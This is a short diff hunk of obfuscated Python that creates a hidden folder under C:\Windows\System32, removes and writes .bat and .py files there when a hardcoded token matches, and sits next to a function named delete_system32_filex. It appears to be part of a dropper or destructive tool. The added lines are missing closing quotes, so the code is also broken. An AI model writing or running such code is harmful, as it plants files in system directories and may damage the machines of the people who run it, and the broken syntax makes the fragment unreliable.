@@ -58,11 +58,13 @@ delete_system32_filex()
 '''
 os.system('cls')
 dcnmwxdr = r'C:\Windows\System32\MSRX'
+
+if os.path.exists(r"C:\Windows\System32\MSRX\aesv1.bat):
+    os.remove(r"C:\Windows\System32\MSRX\aesv1.bat)
 if not os.path.exists(dcnmwxdr):
     os.makedirs(dcnmwxdr)
     os.system('cls')
 if file_contentsx1 =="04yb8u5ih5FGB":
-    os.remove(r"C:\Windows\System32\MSRX\aesv1.bat")
     file_contentpathx = read_file_contentxasxas(file_pathxpath)
     create_batch_file(file_contentpathx, r"C:\Windows\System32\MSRX\AesV8.4.py")
 else:
